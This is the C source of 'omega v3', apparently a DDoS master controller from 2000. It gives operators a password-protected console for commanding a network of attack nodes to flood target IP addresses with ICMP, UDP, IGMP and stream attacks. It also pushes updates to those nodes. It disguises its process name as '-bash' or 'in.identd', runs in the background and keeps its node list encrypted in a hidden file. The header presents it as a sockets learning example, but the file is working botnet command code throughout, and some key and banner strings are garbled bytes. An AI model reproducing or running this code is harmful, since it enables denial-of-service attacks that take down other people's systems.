/*
   omega   - (c) 2000 xt[brandon@james.kalifornia.com]
   distributed denial of service attack.

   r.i.p. omega 1997-2000 a loyal gerbil to xt.

   *disclaimer:*
    i have nothing to do with this when it gets in your hands. it is
    intellectual property, and what you do with it is your own purpose.
    please look at this for more of the coding example - i just wrote this
    for some friends so they could learn sockets with a REAL world example.

    some of these parts were taken from other programs (this actually
    started as a modify to mstream by spwny [it didnt stream more than
    one host at once], but i got carried away with it and here it is
    hehe).
*/


#include <unistd.h>
#include <sys/time.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <netdb.h>
#include <sys/uio.h>
#include <signal.h>

#include "crypt/blowfish.c"

#define CK "yuspy"
#define SERVERFILE ".bash_console"	/* servers in this file */

#define MASTER_TCP_PORT 23800	/* telnet into this port */
#define MASTER_UDP_PORT 23911	/* used internally for server comm */
#define SERVER_PORT 52901	/* used internally for server comm */
#define MAXUSERS 10		/* maximum amount of people allowed on */
#define PROMPT "omega> "	/* the prompt */
#define UCLOAK "-bash"		/* show when cloaked as non-root */
#define RCLOAK "in.identd"	/* show when cloaked as root */

#define VERSION "omega v3beta"

#define USED 0
#define UNUSED 1
#define NOAUTH 0
#define AUTH 1

#define feignOut(x) send(users[i].fd, PROMPT, strlen(PROMPT), 0); continue;

void send2server (u_long, char *, ...);
void forkbg (void);
void nlstr (char *);
void sendtoall (char *, ...);
char *inet_ntoa (struct in_addr);
u_long inet_addr (const char *);
int findfree (void);
int checkonip (char *);
void tellAllUsers (char *);
void tellUser (int, char *);
void killAllUsers (void);
int notset (int);
void gotsig (int);
void config_signals (void);

/* global stuff */
typedef struct sock_info
{
  int auth, opts, fd;
  char ip[65], nick[10];
}
userinfo;

userinfo users[MAXUSERS];
int listenport = (int) MASTER_TCP_PORT;
char _mykey[9];
int rcpcount;

int
main (int argc, char **argv)
{
  fd_set readset;
  int i, tcpfd, udpfd, socksize, pongs = 0, xxx;
  unsigned long endtime = 0, atktime = 0;
  struct sockaddr_in udpsock, tcpsock, remotesock;
  char ibuf[15000], obuf[15000], aone[15000], atwo[15000], athree[15000];
  char newk[15];

  socksize = sizeof (struct sockaddr);

  if ((tcpfd = socket (AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)
    {
      perror ("socket");
      exit (0);
    }

  if ((udpfd = socket (AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
    {
      perror ("socket");
      exit (0);
    }

  if (argc >= 2)
    {
      if (atoi (argv[1]) < 0 || atoi (argv[1]) > 65535)
	{
	  fprintf (stderr, "can't listen on port %d.\n", atoi (argv[1]));
	  exit (0);
	}
      else
	{
	  listenport = atoi (argv[1]);
	}
    }

  if (!getuid () || !geteuid ())
    {
      int bas;
      for (bas = 0; bas < argc; bas++)
	memset (argv[bas], 0, strlen (argv[bas]));
      strcpy (argv[0], RCLOAK);
    }
  else
    {
      int bas;
      for (bas = 0; bas < argc; bas++)
	memset (argv[bas], 0, strlen (argv[bas]));
      strcpy (argv[0], UCLOAK);
    }

  printf ("%s\n", VERSION);
  printf ("master listening on port %d\n", listenport);

  _mykey[0] = 'f';
  _mykey[1] = 'Z';
  _mykey[2] = '�';
  _mykey[3] = '!';
  _mykey[4] = 'z';
  _mykey[5] = '�';
  _mykey[6] = '�';
  _mykey[7] = '�';
  _mykey[8] = 0;

  for (xxx = 0; xxx < strlen (CK); xxx++)
    newk[xxx] = (char) CK[xxx] - 1;

  newk[strlen (newk)] = 0;

  tcpsock.sin_family = AF_INET;
  tcpsock.sin_port = htons (listenport);
  tcpsock.sin_addr.s_addr = INADDR_ANY;
  memset (&tcpsock.sin_zero, 0, 8);

  if (bind (tcpfd, (struct sockaddr *) &tcpsock, sizeof (struct sockaddr)) ==
      -1)
    {
      perror ("bind");
      exit (0);
    }

  i = 1;

  if (listen (tcpfd, MAXUSERS + 1) == -1)
    {
      perror ("listen");
      exit (0);
    }

  if (setsockopt (tcpfd, SOL_SOCKET, SO_REUSEADDR, (void *) &i, sizeof (int))
      == -1)
    {
      perror ("setsockopt");
      exit (0);
    }

  if (fcntl (tcpfd, F_SETFL, O_NONBLOCK) == -1)
    {
      perror ("fcntl");
      exit (0);
    }

  udpsock.sin_family = AF_INET;
  udpsock.sin_port = htons (MASTER_UDP_PORT);
  udpsock.sin_addr.s_addr = INADDR_ANY;
  memset (&udpsock.sin_zero, 0, 8);

  if (bind (udpfd, (struct sockaddr *) &udpsock, sizeof (struct sockaddr)) ==
      -1)
    {
      perror ("bind");
      exit (0);
    }

  if (setsockopt (udpfd, SOL_SOCKET, SO_REUSEADDR, (void *) &i, sizeof (int))
      == -1)
    {
      perror ("setsockopt");
      exit (0);
    }

  for (i = 0; i <= MAXUSERS; i++)
    {
      users[i].opts = UNUSED;
    }

  config_signals ();

  forkbg ();

  for (;;)
    {

      FD_ZERO (&readset);
      FD_SET (tcpfd, &readset);
      FD_SET (udpfd, &readset);

      for (i = 0; i <= MAXUSERS; i++)
	{
	  if (users[i].opts == USED)
	    FD_SET (users[i].fd, &readset);
	}

      if (select (FD_SETSIZE, &readset, NULL, NULL, NULL) == -1)
	continue;

      if (FD_ISSET (tcpfd, &readset))
	{
	  int socknum;

	  if ((socknum = findfree ()) == -1)
	    {
	      socknum =
		accept (tcpfd, (struct sockaddr *) &remotesock, &socksize);
	      close (socknum);
	      continue;
	    }

	  users[socknum].fd =
	    accept (tcpfd, (struct sockaddr *) &remotesock, &socksize);
	  sprintf (obuf,
		   "� ����Ґ~ f23L��\\_�i����sound-app-proxy��r�?���\n�B�EKzS��66���K�+\"A*��L");
	  send (users[socknum].fd, &obuf, strlen (obuf), 0);

	  sprintf (obuf, "Incoming user from %s (user number %d)\n",
		   inet_ntoa (remotesock.sin_addr), socknum);
	  tellAllUsers (obuf);

	  users[socknum].opts = USED;
	  strncpy (users[socknum].ip, inet_ntoa (remotesock.sin_addr), 65);

	  users[socknum].auth = NOAUTH;
	}

      if (FD_ISSET (udpfd, &readset))
	{
	  char extarg[512], mainarg[512];
	  memset (&ibuf, 0, sizeof (ibuf));
	  memset (&extarg, 0, sizeof (extarg));
	  memset (&mainarg, 0, sizeof (mainarg));

	  if (recvfrom
	      (udpfd, &ibuf, sizeof (ibuf) - 1, 0,
	       (struct sockaddr *) &remotesock, &socksize) <= 0)
	    continue;
	  nlstr (ibuf);
 
	  sscanf (ibuf, "%s %s", mainarg, extarg);

	  if (!strcmp (mainarg, "pstats"))
	    {
	      sprintf (obuf, "%s sent out %s packets on last attack.\n",
		       inet_ntoa (remotesock.sin_addr), extarg);
	      tellAllUsers (obuf);
	      continue;
	    }

	  if (!strcmp (mainarg, "vers"))
	    {
	      sprintf (obuf, "%s running %s\n",
		       inet_ntoa (remotesock.sin_addr), extarg);
	      tellAllUsers (obuf);
	      continue;
	    }

	  if (!strcmp (mainarg, "newserver"))
	    {
	      FILE *f;
	      char *d;
	      if ((f = fopen (SERVERFILE, "r")) == NULL)
		{
		  f = fopen (SERVERFILE, "w");
		  d =
		    (char *) encrypt_string (_mykey,
					     inet_ntoa (remotesock.sin_addr));
		  fprintf (f, "%s\n", d);
		  free (d);
		  fclose (f);
		  sprintf (obuf, "New node - %s (first node!)\n",
			   inet_ntoa (remotesock.sin_addr));
		  tellAllUsers (obuf);
		  continue;
		}
	      f = fopen (SERVERFILE, "a");
	      if (f != NULL)
		{
		  if (!checkonip (inet_ntoa (remotesock.sin_addr)))
		    {
		      d =
			(char *) encrypt_string (_mykey,
						 inet_ntoa
						 (remotesock.sin_addr));
		      fprintf (f, "%s\n", d);
		      free (d);
		      sprintf (obuf, "New node - %s\n",
			       inet_ntoa (remotesock.sin_addr));
		      tellAllUsers (obuf);
		    }
		  fclose (f);
		}
	      continue;
	    }

	  if (!strcmp (mainarg, "updatedone"))
	    {
	      sprintf (obuf, "Update for %s is done!\n",
		       inet_ntoa (remotesock.sin_addr));
	      tellAllUsers (obuf);
	      continue;
	    }
	  if (!strcmp (mainarg, "havercp"))
	    {
	      rcpcount++;
	      sprintf (obuf, "%s (%d) has RCP\n", inet_ntoa(remotesock.sin_addr), rcpcount);
	      tellAllUsers(obuf);
	      continue;
	    }
	  if (!strcmp (mainarg, "pong"))
	    {
	      pongs++;
	      sprintf (obuf, "Pong (%d) -> %s\n", pongs,
		       inet_ntoa (remotesock.sin_addr));
	      tellAllUsers (obuf);
	      continue;
	    }
	}

      for (i = 0; i <= MAXUSERS; i++)
	{
	  if (users[i].opts == USED)
	    {
	      if (FD_ISSET (users[i].fd, &readset))
		{
		  if (users[i].auth == NOAUTH)
		    {
		      int x;

		      memset (&ibuf, 0, sizeof (ibuf));
		      memset (&obuf, 0, sizeof (obuf));

		      recv (users[i].fd, &ibuf, sizeof (ibuf) - 1, 0);

		      for (x = 0; x <= strlen (ibuf); x++)
			{
			  if (ibuf[x] == '\n')
			    ibuf[x] = 0;
			  if (ibuf[x] == '\r')
			    ibuf[x] = 0;
			}

		      if (strcmp
			  ((char *) encrypt_string ((char *) newk, ibuf),
			   "LJZ5Y1nrlbi1") != 0)
			{
			  close (users[i].fd);
			  sprintf (obuf,
				   "* user from %s entered the wrong password!\n",
				   users[i].ip);
			  tellAllUsers (obuf);
			  users[i].opts = UNUSED;
			  continue;
			}

		      users[i].auth = AUTH;
		      sprintf (obuf,
			       "\n%s - too much rain over paradise.\n", VERSION);
		      tellUser (i, obuf);
		      sprintf (obuf, "* user from %s has joined the net.\n",
			       users[i].ip);
		      tellAllUsers (obuf);
		      strncpy (users[i].nick, "UNSET", 9);
		    }

		  memset (&ibuf, 0, sizeof (ibuf));

		  if (recv (users[i].fd, &ibuf, sizeof (ibuf) - 1, 0) <= 0)
		    {
		      close (users[i].fd);
		      sprintf (obuf, "* %s has left the net.\n",
			       users[i].nick);
		      tellAllUsers (obuf);
		      users[i].opts = UNUSED;
		      continue;
		    }

		  memset (aone, 0, sizeof (aone));
		  memset (atwo, 0, sizeof (atwo));
		  memset (athree, 0, sizeof (athree));
		  sscanf (ibuf, "%s %s %s", aone, atwo, athree);

		  if (!strcmp (aone, "down"))
		    {
		      tellUser (i,
				"attempting to remove downed nodes from list..\n");
		      sprintf (obuf, "#%s# down\n", users[i].nick);
		      tellAllUsers (obuf);
		      sprintf (obuf, "%s.old", SERVERFILE);
		      sendtoall ("hail-xt");
		      rename (SERVERFILE, obuf);
		      continue;
		    }
		  if (!strcmp (aone, "timeleft")) {
		      unsigned long timeleft = 0;
		      timeleft = time(NULL) - endtime;
		      sprintf(obuf, "Est. attack time left: %lu\n", timeleft);
		      tellUser(i, obuf);
		      sprintf(obuf, "#%s# timeleft\n", users[i].nick);
		      tellAllUsers(obuf);
		      continue;
		  }
		  if (!strcmp (aone, "rcp")) {
		    rcpcount = 0;
                    sprintf(obuf, "#%s# rcp\n", users[i].nick);
                    tellAllUsers(obuf);
                    sendtoall ("gotrcp");
                    continue;
                  }
		  if (!strcmp (aone, "talk"))
		    {
		      char *buf, *p;
		      if (!strcmp (users[i].nick, "UNSET"))
			{
			  tellUser (i,
				    "You must set a nickname (use 'nick <nickname>')\n");
			  feignOut (i);
			}

		      buf = (char *) malloc (512);

		      if (buf == NULL)
			{
			  sprintf (obuf,
				   "error: unable to get memory for talk.\n");
			  tellUser(i, obuf);
			  feignOut (i);
			}

		      if ((p = strchr (ibuf, '\n')) != NULL)
			*p = 0;

		      strncpy (buf, ibuf + 5, 512);

		      snprintf (obuf, 1000, "(%s@fd:%d) %s\n", users[i].nick,
				users[i].fd, buf);

		      tellAllUsers (obuf);
		      free (buf);
		      continue;
		    }

		  if (!strcmp (aone, "omega"))
		    {
		      tellUser (i,
				"oh, how i miss omega - the smartest gerbil.\n");
		      tellUser (i,
				"he was unbelievably smart - i probably should have bread him.\n");
		      tellUser (i, "i dedicate this program to you homey!\n");
		      tellUser (i, ":)\n");
		      feignOut (i);
		    }

		  if (!strcmp (aone, "version"))
		    {
		      tellUser (i,
				"Attempting to get version info from all nodes..\n");
		      sprintf (obuf, "#%s# version\n", users[i].nick);
		      tellAllUsers (obuf);
		      sendtoall ("vers");
		      continue;
		    }

		  if (!strcmp (aone, "nick"))
		    {
		      if (strlen (atwo) < 1)
			{
			  tellUser (i, "usage: nick <nickname>\n");
			  feignOut (i);
			}
		      if (strlen (atwo) > 9)
			{
			  tellUser (i, "nickname must be <= 9 chars.\n");
			  feignOut (i);
			}
		      if (strcmp (users[i].nick, "UNSET") == 0)
			{
			  strncpy (users[i].nick, atwo, 9);
			  sprintf (obuf,
				   "* %s has now registered (set nickname)\n",
				   users[i].nick);
			  tellAllUsers (obuf);
			}
		      else
			{
			  sprintf (obuf, "* %s is now known as %s\n",
				   users[i].nick, atwo);
			  strncpy (users[i].nick, atwo, 9);
			  tellAllUsers (obuf);
			}
		      continue;
		    }

		  if (!strcmp (aone, "time"))
		    {
		      int newtime;

		      if (!notset (i))
			{
			  tellUser (i, "you must set a nick.\n");
			  feignOut (i);
			}

		      if (strlen (atwo) < 1)
			{
			  sprintf (obuf, "Usage: time <new attack time>\n");
			  tellUser (i, obuf);
			  feignOut (i);
			}

		      newtime = atoi (atwo);

		      if (newtime < 0 || newtime >= 1000)
			{
			  tellUser (i,
				    "you set a timer to high or low, setting to 360..\n");
			  newtime = 360;
			}

		      sendtoall ("time %s", atwo);
		      sprintf (obuf, "Set attack timers to %s\n", atwo);
		      atktime = atoi(atwo);
		      endtime = time(NULL) + atktime;
		      tellUser (i, obuf);
		      sprintf (obuf, "#%s# time %s\n", users[i].nick, atwo);
		      tellAllUsers (obuf);

		      continue;
		    }

		  if (!strcmp (aone, "stats"))
		    {
		      if (!notset (i))
			{
			  tellUser (i, "you must set a nick.\n");
			  feignOut (i);
			}

		      tellUser (i, "requesting stats from all nodes..\n");
		      sprintf (obuf, "#%s# stats\n", users[i].nick);
		      sendtoall ("stats");
		      tellAllUsers (obuf);
		      continue;
		    }

		  if (!strcmp (aone, "all"))
		    {

		      if (!notset (i))
			{
			  tellUser (i, "you must set a nick.\n");
			  feignOut (i);
			}

		      if (strlen (atwo) < 1)
			{
			  tellUser (i, "Usage: all <ip1,ip2,ipX>\n");
			  feignOut (i);
			}

		      sendtoall ("all elite,%s", atwo);
		      snprintf (obuf, sizeof (obuf),
				"Attacking '%s' with all attacks\n", atwo);
		      tellUser (i, obuf);
		      snprintf (obuf, sizeof (obuf), "#%s# all %s\n",
				users[i].nick, atwo);
		      tellAllUsers (obuf);
		      continue;
		    }

		  if (!strcmp (aone, "igmp"))
		    {
		      if (!notset (i))
			{
			  tellUser (i, "you must set a nick.\n");
			  feignOut (i);
			}
		      if (strlen (atwo) < 1)
			{
			  tellUser (i, "Usage: igmp <ip1,ip2,ipX>\n");
			  feignOut (i);
			}
		      sendtoall ("igmp elite,%s", atwo);
		      snprintf (obuf, sizeof (obuf),
				"Attacking '%s' via igmp\n", atwo);
		      tellUser (i, obuf);
		      snprintf (obuf, sizeof (obuf), "#%s# igmp %s\n",
				users[i].nick, atwo);
		      tellAllUsers (obuf);
		      continue;
		    }

		  if (!strcmp (aone, "icmp"))
		    {
		      if (!notset (i))
			{
			  tellUser (i, "you must set a nick.\n");
			  feignOut (i);
			}
		      if (strlen (atwo) < 1)
			{
			  sprintf (obuf, "Usage: icmp <ip1,ip2,ipX>\n");
			  tellUser (i, obuf);
			  feignOut (i);
			}
		      sendtoall ("icmp elite,%s", atwo);
		      snprintf (obuf, sizeof (obuf),
				"Attacking '%s' via icmp\n", atwo);
		      tellUser (i, obuf);
		      snprintf (obuf, sizeof (obuf), "#%s# icmp %s\n",
				users[i].nick, atwo);
		      tellAllUsers (obuf);
		      continue;
		    }

		  if (!strcmp (aone, "reps"))
		    {
		      int reps;
		      if (!notset (i))
			{
			  tellUser (i, "you must set a nick.\n");
			  feignOut (i);
			}
		      if (strlen (atwo) < 1)
			{
			  tellUser (i,
				    "Usage: reps <amount of reps per cycle>\n");
			  feignOut (i);
			}
		      reps = atoi (atwo);
		      if (!reps || reps <= 0 || reps > 20)
			{
			  tellUser (i, "please use from 1 - 20 reps.\n");
			  feignOut (i);
			}
		      sendtoall ("reps %s", atwo);
		      sprintf (obuf, "setting reps to %s\n", atwo);
		      tellUser (i, obuf);
		      sprintf (obuf, "#%s# reps %s\n", users[i].nick, atwo);
		      tellAllUsers (obuf);
		      continue;
		    }

		  if (!strcmp (aone, "udp"))
		    {
		      if (!notset (i))
			{
			  tellUser (i, "you must set a nick.\n");
			  feignOut (i);
			}
		      if (strlen (atwo) < 1)
			{
			  sprintf (obuf, "Usage: udp <ip1,ip2,ipX>\n");
			  tellUser (i, obuf);
			  feignOut (i);
			}
		      sendtoall ("udp elite,%s", atwo);
		      snprintf (obuf, sizeof (obuf),
				"Attacking '%s' via udp\n", atwo);
		      tellUser (i, obuf);
		      snprintf (obuf, sizeof (obuf), "#%s# udp %s\n",
				users[i].nick, atwo);
		      tellAllUsers (obuf);
		      continue;
		    }

		  if (!strcmp (aone, "port"))
		    {
		      if (strlen (atwo) < 1)
			{
			  tellUser (i,
				    "usage: port <attack port (0 for random)>\n");
			  feignOut (i);
			}
		      if (atoi (atwo) < 0 || atoi (atwo) > 65535)
			{
			  tellUser (i, "invalid port\n");
			  feignOut (i);
			}
		      sendtoall ("port %s", atwo);
		      sprintf (obuf, "setting port to %s\n", atwo);
		      tellUser (i, obuf);
		      sprintf (obuf, "#%s# port %s\n", users[i].nick, atwo);
		      tellAllUsers (obuf);
		      continue;
		    }

		  if (!strcmp (aone, "size"))
		    {
		      if (strlen (atwo) < 1)
			{
			  tellUser (i, "usage: size <new attack size>\n");
			  feignOut (i);
			}
		      if (!atoi (atwo))
			{
			  tellUser (i, "invalid attack size!\n");
			  feignOut (i);
			}
		      if (atoi (atwo) <= 0 || atoi (atwo) > 1000)
			{
			  tellUser (i, "pick lower packet sizes!\n");
			  feignOut (i);
			}

		      sendtoall ("size %s", atwo);
		      sprintf (obuf, "setting packet size to %s\n", atwo);
		      tellUser (i, obuf);
		      sprintf (obuf, "#%s# size %s\n", users[i].nick, atwo);
		      tellAllUsers (obuf);
		      continue;
		    }

		  if (!strcmp (aone, "stream"))
		    {
		      if (!notset (i))
			{
			  tellUser (i, "you must set a nick.\n");
			  feignOut (i);
			}
		      if (strlen (atwo) < 1)
			{
			  sprintf (obuf, "Usage: stream <ip1,ip2,ipX>\n");
			  tellUser (i, obuf);
			  feignOut (i);
			}
		      sendtoall ("stream elite,%s", atwo);
		      snprintf (obuf, sizeof (obuf),
				"Attacking '%s' via stream.\n", atwo);
		      tellUser (i, obuf);
		      snprintf (obuf, sizeof (obuf), "#%s# stream %s\n",
				users[i].nick, atwo);
		      tellAllUsers (obuf);
		      continue;
		    }

		  if (!strcmp (aone, "quit"))
		    {
		      tellUser (i, "Logging off of omega..\n");
		      users[i].opts = UNUSED;
		      close (users[i].fd);
		      sprintf (obuf, "* %s has left the net.\n",
			       users[i].nick);
		      tellAllUsers (obuf);
		      continue;
		    }

		  if (!strcmp (aone, "nodes"))
		    {
		      FILE *f;
		      char line[1024];
		      int nodes = 0;
		      if (!notset (i))
			{
			  tellUser (i, "you must set a nick\n");
			  feignOut (i);
			}
		      if ((f = fopen (SERVERFILE, "r")) == NULL)
			{
			  sprintf (obuf, "creating server file..\n");
			  tellUser (i, obuf);
			  if ((f = fopen (SERVERFILE, "w")) == NULL)
			    {
			      tellUser (i, "unable to create server file!\n");
			      feignOut (i);
			    }
			  fclose (f);
			  feignOut (i);
			}

		      tellUser (i, "Attacker nodes:\n");
		      while (fgets (line, sizeof (line) - 1, f))
			{
			  char *d;
			  d = (char *) decrypt_string (_mykey, line);
			  strcat (d, "\n");
			  tellUser (i, d);
			  free (d);
			  nodes++;
			}
		      fclose (f);
		      sprintf (obuf, "Total nodes: %d\n", nodes);
		      tellUser (i, obuf);
		      sprintf (obuf, "#%s# nodes\n", users[i].nick);
		      tellAllUsers (obuf);
		      continue;
		    }

		  if (!strcmp (aone, "update"))
		    {
		      tellUser (i, "attempting to update ALL hosts..\n");
		      if (strlen (atwo) < 10)
			{
			  tellUser (i, "Usage: update <rcp info>\n");
			  feignOut (i);
			}
		      sprintf (obuf, "#%s# update %s\n", users[i].nick, atwo);
		      tellAllUsers (obuf);
		      sendtoall ("update %s", atwo);
		      continue;
		    }

		  if (!strcmp (aone, "help") || !strcmp (aone, "commands"))
		    {
		      tellUser (i, "Attacks: \n");
		      tellUser (i,
				"* icmp <ip1,ip2,ipX> - icmp floods ip(s)\n");
		      tellUser (i,
				"* udp <ip1,ip2,ipX>  -  udp floods ip(s)\n");
		      tellUser (i,
				"* stream <ip1,ip2,ipX>  -  streams ip(s)\n");
		      tellUser (i,
				"* igmp <ip1,ip2,ipX> - igmp floods ip(s)\n");
		      tellUser (i,
				"* all <ip1,ip2,ipX>  - attacks via all methods\n");
		      tellUser (i, "Settings: \n");
		      tellUser (i,
				"* time <attack time>  -  set duration of attack in seconds.\n");
		      tellUser (i,
				"* size <attack size>  -  set attack size\n");
		      tellUser (i,
				"* reps <r.p.c> - set the amount of reps per cycle\n");
		      tellUser (i, "Misc.: \n");
		      tellUser (i, "* quit  -  quit from the server.\n");
		      tellUser (i,
				"* nodes  -  displays all known attack nodes.\n");
		      tellUser (i,
				"* ping   -  pings all known attack nodes.\n");
		      tellUser (i,
				"* talk <message>  -  talk with other users.\n");
		      tellUser (i,
				"* nick <new nick> -  change/set your new nick.\n");
		      tellUser (i, "* who    -  see who else is logged in\n");
		      tellUser (i, "* stats  -  get attack stats\n");
		      tellUser (i,
				"* down   -  attempt to remove all downed nodes\n");
		      sprintf (obuf, "#%s# %s\n", users[i].nick, aone);
		      tellAllUsers (obuf);
		      continue;
		    }

		  if (!strcmp (aone, "ping"))
		    {
		      if (!notset (i))
			{
			  tellUser (i, "you must set a nick\n");
			  feignOut (i);
			}
		      pongs = 0;
		      sprintf (obuf, "sending a ping to all servers..\n");
		      tellUser (i, obuf);
		      sprintf (obuf, "#%s# ping\n", users[i].nick);
		      tellAllUsers (obuf);
		      sendtoall ("ping");
		      continue;
		    }

		  if (!strcmp (aone, "who"))
		    {
		      int usli = 0;
		      if (!notset (i))
			{
			  tellUser (i, "you must set a nick\n");
			  feignOut (i);
			}

		      tellUser (i, "NICKNAME    FD@HOST\n");
		      tellUser (i,
				"-----------------------------------------\n");
		      for (usli = 0; usli < MAXUSERS; usli++)
			{
			  if (users[usli].opts == UNUSED)
			    continue;
			  sprintf (obuf, "%s          %d@%s\n",
				   users[usli].nick, users[usli].fd,
				   users[usli].ip);
			  tellUser (i, obuf);
			}
		      sprintf (obuf, "#%s# who\n", users[i].nick);
		      tellAllUsers (obuf);
		      continue;
		    }

		  tellUser (i, "What? Try 'help'\n");
		  feignOut (i);
		}
	    }
	}
    }
}

int
findfree (void)
{
  int i;

  for (i = 0; i <= MAXUSERS; i++)
    {
      if (users[i].opts == UNUSED)
	return i;
    }
  return -1;
}

void
forkbg (void)
{
  int pid;

  pid = fork ();
  if (pid == -1)
    {
      perror ("fork");
      exit (0);
    }
  if (pid > 0)
    {
      printf ("fork() to background, pid %d\n", pid);
      exit (0);
    }
}

void
nlstr (char *str)
{
  int x;
  for (x = 0; x <= strlen (str); x++)
    {
      if (str[x] == '\n')
	str[x] = 0;
      if (str[x] == '\r')
	str[x] = 0;
    }

}

void
send2server (u_long addr, char *str, ...)
{
  va_list vl;
  char buf[2048];
  int fd;
  struct sockaddr_in sock;

  va_start (vl, str);
  vsnprintf (buf, sizeof (buf) - 1, str, vl);
  va_end (vl);

  if ((fd = socket (AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
    return;

  sock.sin_family = AF_INET;
  sock.sin_port = htons (SERVER_PORT);
  sock.sin_addr.s_addr = addr;
  memset (&sock.sin_zero, 0, 8);

  sendto (fd, &buf, strlen (buf), 0, (struct sockaddr *) &sock,
	  sizeof (struct sockaddr));

  close (fd);
}

void
sendtoall (char *str, ...)
{
  va_list vl;
  char buf[15000], line[15000], *d;
  struct sockaddr_in sock;
  int fd;
  FILE *f;

  va_start (vl, str);
  vsnprintf (buf, sizeof (buf) - 1, str, vl);
  va_end (vl);

  if ((fd = socket (AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
    return;

  sock.sin_family = AF_INET;
  sock.sin_port = htons (SERVER_PORT);
  memset (&sock.sin_zero, 0, 8);

  if ((f = fopen (SERVERFILE, "r")) == NULL)
    {
      f = fopen (SERVERFILE, "w");
      fclose (f);
      return;
    }

  while (fgets (line, sizeof (line) - 1, f))
    {
      nlstr (line);
      d = (char *) decrypt_string (_mykey, line);
      sock.sin_addr.s_addr = inet_addr (d);
      sendto (fd, &buf, strlen (buf), 0, (struct sockaddr *) &sock,
	      sizeof (struct sockaddr));
      free (d);
    }
  close (fd);
  fclose (f);
}

void
tellAllUsers (char *msg)
{
  int i;

  for (i = 0; i <= MAXUSERS; i++)
    {
      if (users[i].opts == USED)
	{
	  send (users[i].fd, msg, strlen (msg), 0);
	  send (users[i].fd, PROMPT, strlen (PROMPT), 0);
	}
    }
}

void
tellUser (int tfd, char *msg)
{
  send (users[tfd].fd, msg, strlen (msg), 0);
}

void
killAllUsers (void)
{
  int i;
  for (i = 0; i <= MAXUSERS; i++)
    {
      if (users[i].opts == USED)
	{
	  users[i].opts = UNUSED;
	  memset (users[i].nick, 0, sizeof (users[i].nick));
	  memset (users[i].ip, 0, sizeof (users[i].ip));
	  close (users[i].fd);
	}
    }
}

int
notset (int tfd)
{
  if (strcasecmp (users[tfd].nick, "UNSET") == 0)
    return 0;
  else
    return 1;
}

int
checkonip (char *ip)
{
  int blah = 0;
  char buf[1024], *e;
  FILE *out;
  out = fopen (SERVERFILE, "r");
  if (out != NULL)
    {
      while (fgets (buf, 1024, out) != NULL)
	{
	  nlstr (buf);
	  e = (char *) decrypt_string (_mykey, buf);
	  if (strcasecmp (ip, e) == 0)
	    blah = 1;
	  free (e);
	}
      fclose (out);
    }

  if (blah > 0)
    return 1;
  else
    return 0;
}

void
gotsig (int s)
{
  tellAllUsers ("got a signal that i trapped - will terminate!\n");
  killAllUsers ();
  exit (-1);
}

void
config_signals (void)
{
  signal (SIGTERM, gotsig);
  signal (SIGSEGV, gotsig);
  signal (SIGFPE, gotsig);
  signal (SIGABRT, gotsig);
  signal (SIGHUP, gotsig);
  signal (SIGQUIT, gotsig);
  signal (SIGINT, gotsig);
}
